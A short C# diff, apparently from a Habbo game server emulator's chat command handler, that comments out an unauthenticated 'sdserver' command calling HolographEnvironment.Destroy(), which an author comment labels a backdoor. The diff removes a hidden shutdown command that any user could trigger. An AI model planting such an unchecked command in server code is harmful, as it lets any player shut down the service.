@@ -332,9 +332,10 @@ internal class ChatCommandHandler
 				Session.SendNotif(message);
 				return true;
 			}
-			case "sdserver":
-				HolographEnvironment.Destroy();
-				break;
+			// BACKDOORS COMMENTED OUT - Quackster
+			//case "sdserver":
+			//	HolographEnvironment.Destroy();
+			//	break;
 			case "emblema":
 				if (Session.GetHabbo().Rank >= 4)
 				{
